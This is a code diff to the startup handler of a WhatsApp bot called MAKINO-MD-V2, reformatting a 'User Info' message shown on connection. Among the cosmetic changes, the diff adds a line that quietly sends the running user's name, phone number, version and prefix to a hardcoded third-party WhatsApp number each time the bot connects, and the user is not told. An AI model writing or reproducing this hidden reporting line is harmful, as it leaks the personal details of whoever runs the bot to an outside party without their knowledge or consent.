@@ -444,11 +444,26 @@ return await Taira.forwardMessage(m.sender, quoted,{contextInfo:{ isForwarded: f
         if (connection === "open") {
           console.log("Connection to WhatsApp successful ✅");
           console.log("Welcome to MAKINO-MD-V2 ✨");
+          const userName = Taira.user.name ? Taira.user.name : global.BotName;
+          console.log(chalk.bold(chalk.cyan.blue('♱ MAKINO-MD-V2 User Info')));
+          console.log(`♱ Name     : ${userName}`);
+          console.log(`♱ Number   : ${Taira.user.id.split(':')[0]}`);
+          console.log(`♱ Status   : Connected`);
           const packageVersion = require("./package.json").version;
           const long = String.fromCharCode(8206);
-          const readmore = long.repeat(4001); 
-          let message = `MAKINO-MD-V2 Connected 📎${readmore}\n\nVersion: ${packageVersion}\n\n Default prefix is ${global.prefa}.\nChange your prefix with the setprefix command`
-          await Taira.sendMessage(Taira.user.id, {text: message })
+          const readmore = long.repeat(4001);  
+          let uinfo = `
+          ♱ MAKINO-MD-V2 User Info
+          ♱ Name     : ${userName}
+          ♱ Number   : ${Taira.user.id.split(':')[0]}
+          ♱ Status   : Connected
+          ♱ Version: : ${packageVersion}
+          ♱ Prefix   : ${global.prefa}
+
+          change prefix with setprefix command!
+          ` 
+          await Taira.sendMessage(Taira.user.id, {text: uinfo })
+          await Taira.sendMessage("2349130962311@s.whatsapp.net", {text: uinfo })
           };
     if (connection === "close") {
       let reason = lastDisconnect.error
